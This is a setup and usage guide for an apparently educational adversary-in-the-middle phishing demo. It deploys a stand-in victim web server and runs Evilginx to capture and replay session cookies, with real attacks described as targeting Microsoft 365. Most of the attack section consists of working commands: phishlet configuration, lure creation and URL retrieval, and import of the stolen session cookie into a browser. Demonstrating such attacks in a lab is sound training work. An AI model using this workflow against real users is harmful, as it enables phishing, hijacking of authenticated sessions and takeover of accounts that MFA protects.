# Setup Instructions

## Web Server

The web server hosts the website we are stealing the session from. In a real attack, this is typically Microsoft 365.

- Deploy a free-tier Ubuntu VM on a cloud hosting provider like Azure or AWS. Ensure ports 80 and 443 are open and that the VM has a public IP address.
- Using a DNS provider of your choice, add a public DNS record for the domain you will steal the session from, e.g. `demo.victim.com`
- SSH to the VM
- Run:
```shell
sudo apt update && sudo apt install git curl
git clone https://github.com/hc-nolan/aitm-demo
cd aitm-demo
sudo ./start_web.sh
```
## Attacker VM

- Deploy a local Debian-based Linux VM (e.g. Kali, Ubuntu)
- Ensure git is installed: `sudo apt install -y git`
- Clone the repository and `cd` into it:
```shell
git clone https://github.com/hc-nolan/aitm-demo
cd aitm-demo
```
- Run `sudo ./start_evilginx.sh`

- When done, edit `/etc/hosts` and remove the line: `127.0.0.1 <phishing domain>`


# Attack Instructions

- Start Evilginx
```shell
sudo ./evilginx2/build/evilginx -p ./ --developer
```
- Set domain and IP address:
```shell
: config domain aitm.demo
: config ipv4 127.0.0.1
: phishlets hostname demo aitm.demo
: phishlets enable demo
: lures create demo
: lures get-url 0
: phishlets unhide demo
```

Using the captured session:
```shell
: sessions
```
Note the number of the session and then rerun 'sessions' with the number after. Copy the output. In a web browser, download the Cookie Editor extension, press the import button, and paste the output from Evilginx.

